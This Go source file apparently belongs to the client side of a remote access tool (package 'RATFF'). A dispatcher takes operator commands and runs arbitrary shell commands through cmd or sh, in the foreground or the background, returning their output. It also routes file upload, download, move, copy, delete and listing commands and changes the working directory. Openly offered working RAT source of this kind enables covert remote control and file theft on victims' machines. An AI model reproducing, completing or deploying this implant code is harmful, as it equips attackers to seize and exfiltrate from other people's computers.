package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"sync"

	"RATFF/shared"
)

// workingDir stores the current working directory for shell commands.
var workingDir string

// workingMu protects workingDir for concurrent access.
var workingMu sync.RWMutex

// executeCommand routes incoming commands to their handlers.
func executeCommand(msg shared.Message) shared.Message {
	log.WithField("command", msg.Command).Info("Executing command")

	switch msg.Command {
	case shared.CmdShellExec:
		return handleShellExec(msg)
	case shared.CmdShellExecBg:
		return handleShellExecBg(msg)
	case shared.CmdSystemInfo:
		return handleSystemInfo(msg)
	case shared.CmdExit:
		log.Info("Received exit command, shutting down")
		os.Exit(0)
		return shared.Message{}
	case shared.CmdCd:
		return handleCd(msg)
	case shared.CmdFileUploadStart:
		return handleFileUploadStart(msg)
	case shared.CmdFileUploadChunk:
		return handleFileUploadChunk(msg)
	case shared.CmdFileUploadComplete:
		return handleFileUploadComplete(msg)
	case shared.CmdFileDownloadStart:
		return handleFileDownloadStart(msg)
	case shared.CmdFileDownloadChunk:
		return handleFileDownloadChunk(msg)
	case shared.CmdFileDownloadComplete:
		return handleFileDownloadComplete(msg)
	case shared.CmdFileList:
		return handleFileList(msg)
	case shared.CmdFileMove:
		return handleFileMove(msg)
	case shared.CmdFileDelete:
		return handleFileDelete(msg)
	case shared.CmdFileCopy:
		return handleFileCopy(msg)
	case shared.CmdPwd:
		return handlePwd(msg)
	default:
		return shared.NewMessage(shared.MsgError, msg.Command, msg.ClientID,
			map[string]interface{}{"error": "unknown command"})
	}
}

// handleShellExec executes a shell command and returns stdout, stderr, and exit code.
func handleShellExec(msg shared.Message) shared.Message {
	cmdStr, _ := msg.Payload["cmd"].(string)
	if cmdStr == "" {
		return shared.NewMessage(shared.MsgError, "", msg.ClientID,
			map[string]interface{}{"error": "empty command"})
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	workingMu.RLock()
	if workingDir != "" {
		cmd.Dir = workingDir
	}
	workingMu.RUnlock()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}
	}

	result := map[string]interface{}{
		"command":   cmdStr,
		"stdout":    stdout.String(),
		"stderr":    stderr.String(),
		"exit_code": exitCode,
	}

	return shared.NewMessage(shared.MsgResponse, "", msg.ClientID, result)
}

// handleCd changes the working directory of the client.
func handleCd(msg shared.Message) shared.Message {
	dir, _ := msg.Payload["dir"].(string)
	if dir == "" {
		return shared.NewMessage(shared.MsgError, shared.CmdCd, msg.ClientID,
			map[string]interface{}{"error": "empty directory"})
	}

	workingMu.Lock()
	err := os.Chdir(dir)
	if err != nil {
		workingMu.Unlock()
		return shared.NewMessage(shared.MsgError, shared.CmdCd, msg.ClientID,
			map[string]interface{}{"error": err.Error()})
	}

	currentDir, wdErr := os.Getwd()
	if wdErr != nil {
		workingMu.Unlock()
		return shared.NewMessage(shared.MsgError, shared.CmdCd, msg.ClientID,
			map[string]interface{}{"error": fmt.Sprintf("get working directory failed: %v", wdErr)})
	}
	workingDir = currentDir
	workingMu.Unlock()

	return shared.NewMessage(shared.MsgResponse, shared.CmdCd, msg.ClientID,
		map[string]interface{}{"current_dir": currentDir})
}

// handleShellExecBg executes a shell command in background and returns immediately.
// The command output can be redirected to a file if specified in the payload.
func handleShellExecBg(msg shared.Message) shared.Message {
	cmdStr, _ := msg.Payload["cmd"].(string)
	if cmdStr == "" {
		return shared.NewMessage(shared.MsgError, "", msg.ClientID,
			map[string]interface{}{"error": "empty command"})
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	workingMu.RLock()
	if workingDir != "" {
		cmd.Dir = workingDir
	}
	workingMu.RUnlock()

	outputFile, _ := msg.Payload["output_file"].(string)
	var err error
	if outputFile != "" {
		file, ferr := os.Create(outputFile)
		if ferr != nil {
			return shared.NewMessage(shared.MsgError, "", msg.ClientID,
				map[string]interface{}{"error": ferr.Error()})
		}
		cmd.Stdout = file
		cmd.Stderr = file

		err = cmd.Start()
		if err != nil {
			file.Close()
			return shared.NewMessage(shared.MsgError, "", msg.ClientID,
				map[string]interface{}{"error": err.Error()})
		}

		go func() {
			_ = cmd.Wait()
			file.Close()
		}()
	} else {
		err = cmd.Start()
		if err != nil {
			return shared.NewMessage(shared.MsgError, "", msg.ClientID,
				map[string]interface{}{"error": err.Error()})
		}
	}

	result := map[string]interface{}{
		"status":      "started",
		"command":     cmdStr,
		"output_file": outputFile,
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdShellExecBg, msg.ClientID, result)
}

func handlePwd(msg shared.Message) shared.Message {
	workingMu.RLock()
	dir := workingDir
	workingMu.RUnlock()

	if dir == "" {
		var err error
		dir, err = os.Getwd()
		if err != nil {
			return shared.NewMessage(shared.MsgError, shared.CmdPwd, msg.ClientID,
				map[string]interface{}{"error": fmt.Sprintf("get working directory failed: %v", err)})
		}
	}

	return shared.NewMessage(shared.MsgResponse, shared.CmdPwd, msg.ClientID,
		map[string]interface{}{"current_dir": dir})
}
